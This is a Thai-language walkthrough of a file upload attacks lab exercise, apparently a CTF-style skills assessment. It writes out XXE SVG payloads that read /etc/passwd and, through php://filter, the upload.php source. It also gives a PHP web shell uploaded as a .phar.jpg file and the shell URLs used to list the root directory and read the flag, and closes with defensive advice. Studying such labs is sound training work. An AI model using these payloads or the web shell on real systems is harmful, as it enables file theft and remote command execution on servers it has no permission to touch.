สรุป Skills Assessment - File Upload Attacks
Extra Exercise

Vulnerability Summary:
จากการทดสอบระบบอัปโหลดไฟล์ พบว่า:
  - ตรวจเฉพาะ extension และ Content-Type
  - ไม่ตรวจ magic bytes ของไฟล์ (เช่น JPEG header 0xFFD8)
  - เปิด XML parser โดยไม่ได้ปิด ENTITY / DOCTYPE
  - ไม่ sanitize tag อันตราย (<script>, <!DOCTYPE>, <!ENTITY>)

XXE ทดสอบโดย File Read (/etc/passwd)
Payload:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <svg>&xxe;</svg>
ระบบ render ข้อมูลจาก /etc/passwd  ยืนยันว่า XXE สำเร็จ

ต่อไปเราจะอ่านโค้ดของไฟล์ upload.php เพื่อดูว่ารูป/shell ถูกอัพไปไว้ที่ path ไหน
Payload:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
  <svg>&xxe;</svg>
ชุดนี้คือ payload ที่ใช้อ่าน source code

จากการอ่านโค้ด:
  - ระบบตั้งชื่อไฟล์ตาม date('ymd')
  - ใช้ basename($_FILES['uploadFile']['name'])
  - ไม่ตรวจ magic bytes
  - ไม่ block .phar.jpg หรือ content ที่เป็น PHP
  - เก็บที่ path /contact/user_fxxxx_xxxx

Upload Shell
  Shell:
  <?php echo system($_GET['cmd']); ?>
  file ที่อัพขึ้นไปชื่อ name.jpg
  หลังจากจะอัพขึ้นจะได้ชื่อไฟล์ในระบบเป็น
  ymd = 250511
  เช่น ชื่อไฟล์ 250511_name.phar.jpg

จากนั้นเรียก shell
  /250511_cat.phar.jpeg?cmd=ls+/
  จะได้ list file ใน path root ออกมาแล้วมองหาไฟล์ flag

จากนั้นก็
  /250511_cat.phar.jpeg?cmd=cat+/flag_xxxxxx.txt

สรุปช่องโหว่
  XXE	Parser ไม่ปิด ENTITY / DOCTYPE
  Source Code Disclosure	ใช้ php://filter ผ่าน XXE
  ตรวจ MIME/ext แต่ไม่ตรวจเนื้อไฟล์

วิธีป้องกัน
  - ปิด ENTITY, DOCTYPE, external entities ใน XML parser
  - ตรวจ magic bytes ไม่เชื่อ MIME, ext อย่างเดียว
  - กรองชื่อไฟล์ / content ที่เป็น PHP








